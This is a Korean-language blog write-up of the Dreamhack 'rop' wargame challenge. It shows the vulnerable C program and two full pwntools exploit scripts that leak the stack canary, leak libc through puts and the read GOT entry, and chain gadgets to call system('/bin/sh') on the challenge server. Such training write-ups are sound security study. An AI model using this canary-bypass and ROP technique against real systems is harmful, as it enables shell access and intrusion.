---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN rop"
excerpt: "드림핵 포너블 rop 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-03-12 17:00
---

오랜만에 풀어보는 ROP 문제다. 다만 기존에 풀었던 64비트 ROP에 canary가 첨가되어 있다.
압축 파일을 풀어보면 libc와 코드, 바이너리, 도커 파일이 들어있다. 도커파일 이미지를 다운받아 확인해 보니 ubuntu bionic으로 18.04 버전을 사용하고 있다.

해당 문제 소스코드는 다음과 같다.

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

코드는 매우 간단하다. [1] 섹션에서 카나리 값을 릭 하고 [2]에서 ROP를 일으키면 될것 같다.

버퍼의 크기는 0x30인데 0x100 길이의 값을 read함수로 받기 때문에 0x31만큼의 값을 주면 \x00 이 없어 카나리 7바이트와 입력한 마지막 1자리 값이 출력 될 것이다.

이후 릭한 카나리를 이용해서 ROP 공격을 시도한다. put plt를 이용해 read got 주소를 출력해 libc 베이스 주소를 구한다. 이후 libc의 system 함수 오프셋을 더해 /bin/sh를 인자로 하여 system 함수를 실행시키는 것이 내가 구상한 시나리오이다.

간단하게 익스플로잇 코드를 구성해보자.

```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 19094);
#p = process("./rop", env={'LD_PRELOAD':'./libc-2.27.so'})
#p = process("./house_of_force")
elf = ELF("./rop")
libc = ELF("./libc-2.27.so")

pr = 0x4007f3
read_got = elf.got["read"]
puts_plt = elf.plt["puts"]
main_func = elf.symbols["main"]

print(f"read got : {hex(read_got)}")
print(f"puts plt : {hex(puts_plt)}")
print(f"main func : {hex(main_func)}")

p.sendafter(b"Buf: ", b"A"*0x39)
p.recvuntil(b"A"*0x39)
leak = b"\x00"+p.recvn(7)
canary = u64(leak)
print(f"leak canary : {hex(canary)}")

payload1 = b"A"*0x38
payload1 += p64(canary)
payload1 += p64(0x400790)
payload1 += p64(pr)
payload1 += p64(read_got)
payload1 += p64(puts_plt)
payload1 += p64(main_func)

p.sendlineafter(b"Input ROP payload\nBuf: ", payload1)

leak_read_got = u64(p.recvuntil(b"\n")[:-1]+b"\x00\x00")
libc_base = leak_read_got - libc.sym["read"]
system = libc_base + libc.sym["system"]
binsh = libc_base+list(libc.search(b"/bin/sh"))[0]

print(f"libc main : {hex(libc_base)}")
print(f"system : {hex(system)}")
print(f"binsh : {hex(binsh)}")

p.sendafter(b"Buf: ", b"A"*0x30)
```

위 코드를 이용해 우선 카나리와 libc 베이스 주소를 구하고 다시 main함수로 돌려버린다.
puts 함수는 인자를 1개 이용하기 때문에 pop rdi ; ret 가젯을 이용했다. 

이후 릭된 값을들 다시 구성해 system 함수를 콜하게 하면 된다. 여기서 [1] 부분은 기존 코드 그대로 이용했고 [2]에서 바로 system 함수를 콜하려 했지만 문제가 발생했다. 그래서 libc를 구할때 사용했던 코드는 정상 동작해서 puts 함수가 동작 한 후 main_func 부분을 다히 pr 가젯으로 주고 system 함수를 콜 했다.

최종적인 익스플로잇 코드는 다음과 같다.

```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 19094);
#p = process("./rop", env={'LD_PRELOAD':'./libc-2.27.so'})
#p = process("./house_of_force")
elf = ELF("./rop")
libc = ELF("./libc-2.27.so")

pr = 0x4007f3
read_got = elf.got["read"]
puts_plt = elf.plt["puts"]
main_func = elf.symbols["main"]

print(f"read got : {hex(read_got)}")
print(f"puts plt : {hex(puts_plt)}")
print(f"main func : {hex(main_func)}")

p.sendafter(b"Buf: ", b"A"*0x39)
p.recvuntil(b"A"*0x39)
leak = b"\x00"+p.recvn(7)
canary = u64(leak)
print(f"leak canary : {hex(canary)}")

payload1 = b"A"*0x38
payload1 += p64(canary)
payload1 += p64(0x400790)
payload1 += p64(pr)
payload1 += p64(read_got)
payload1 += p64(puts_plt)
payload1 += p64(main_func)

p.sendlineafter(b"Input ROP payload\nBuf: ", payload1)

leak_read_got = u64(p.recvuntil(b"\n")[:-1]+b"\x00\x00")
libc_base = leak_read_got - libc.sym["read"]
system = libc_base + libc.sym["system"]
binsh = libc_base+list(libc.search(b"/bin/sh"))[0]

print(f"libc main : {hex(libc_base)}")
print(f"system : {hex(system)}")
print(f"binsh : {hex(binsh)}")

p.sendafter(b"Buf: ", b"A"*0x30)

payload2 = b"A"*0x38
payload2 += p64(canary)
payload2 += p64(0x400790)
payload2 += p64(pr)
payload2 += p64(read_got)
payload2 += p64(puts_plt)
payload2 += p64(pr)
payload2 += p64(binsh)
payload2 += p64(system)

pause()

p.sendafter(b"Input ROP payload\nBuf: ", payload2)


p.interactive()
```

[2] 부분에서 libc를 릭하면서 바로 system 함수를 호출하는 방법을 쓰신 분들도 봤는데 필자는 함수 흐름을 돌리는 것이 편해서 이렇게 구성했다.

위 코드를 이용하면 flag를 얻을 수 있다.